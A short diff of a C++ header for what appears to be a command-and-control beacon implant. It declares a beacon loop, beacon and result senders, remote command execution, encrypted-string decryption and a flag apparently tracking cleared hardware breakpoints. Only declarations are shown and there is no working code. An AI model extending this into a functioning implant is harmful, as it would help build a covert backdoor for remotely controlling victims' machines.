@@ -16,8 +16,8 @@ struct Session {
     BOOL  hwbpsCleared;
 };
 
-VOID BeaconLoop();
-BOOL SendBeacon(const Session& session, std::wstring& taskOut);  // removed isFirstBeacon
+VOID BeaconLoop(const Session& session);
+BOOL SendBeacon(const Session& session, std::wstring& taskOut);
 BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);
 std::wstring ExecuteCommand(const std::wstring& cmd);
 std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key);
